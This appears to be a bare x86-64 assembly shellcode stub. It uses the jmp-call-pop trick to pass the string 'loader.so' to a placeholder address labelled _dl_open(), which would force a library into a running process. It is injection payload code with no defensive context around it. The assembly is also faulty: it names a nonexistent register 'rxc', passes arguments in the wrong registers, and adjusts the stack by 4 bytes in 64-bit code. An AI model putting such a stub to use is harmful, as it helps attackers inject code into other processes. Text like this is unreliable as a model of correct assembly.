_start: 
	jmp string

begin: 
	pop rax			; char* file
	xor rxc, rcx		; *caller
	mov rdx, 0x1		; int mode

	mov rbx, 0x12345678     ; addr of _dl_open()
	call rbx
	add rsp, 0x4

	int3			; breakpoint

string:
	call begin
	db "loader.so",0x00
